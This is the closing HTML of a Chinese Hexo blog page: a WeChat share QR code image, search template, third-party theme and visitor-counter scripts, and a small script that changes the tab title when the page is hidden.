    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3ayw7DMAhE0fz/T7vbSI2tGXAiGW5WVfM8qUQBc13yNm7b7Pv73jHZ7ntnn//vsm2DAQPGsYyx3JRjZmetHzrzOh6uAwMGjAaM2aVjx+hhdH2kchYMGDBg6I/ohuD1dWDAgAHj7YC7K+2DAQMGjNjl3ICrp4Mf1eIwYMA4kKF33b///Mr6BgwYMI5ixNr9mQXLV54KBgwYpRn6bTLJYmx0wx7+gAEDRlGGXrKuRyhibCWUz+718DvAgAGjKMMNke4ghRtk3cEL6TeBAQNGIYbbXHNTRiN0yi8IBgwYHRixllkmKGdKXKkKhwEDRmlGZvxCGaRwRyv0BBEGDBgdGHpRumsILNbUm5JgwIBRmqG3wxTMhnpaPmZ6ZRgwYDRg6N+4wVpv0qXacDBgwCjH0IvMWNkZSxzdoA8DBow+DKWVFgujbpPOTRBhwIDRgeEWqPoCpxJwM8Vtqs6GAQPGIQw3mcu38t2CWS9uYcCA0YehIPVFynyANjAwYMBowHCb8u7I1/qlxJYKHpYHYMCAUZrhBjsdkEko7YocBgwYbRhuY86Y6ZBDs30WDBgwijKGuelFaWbxUg/cxj8GDBgwjmVk1gfdyymvQ2nG6WEdBgwYlRh6kFVSyViK6Vaj9r8HDBgwSjDchcn3AmuwqwYDBgwY6bba3r2XEsthwIDRmKEPZ7hFaSx9hAEDRh/G3pGvXcuZRjiGAQNGaUYs74p9E0sK88sSMGDAOJbxA7PLiYckAGWsAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
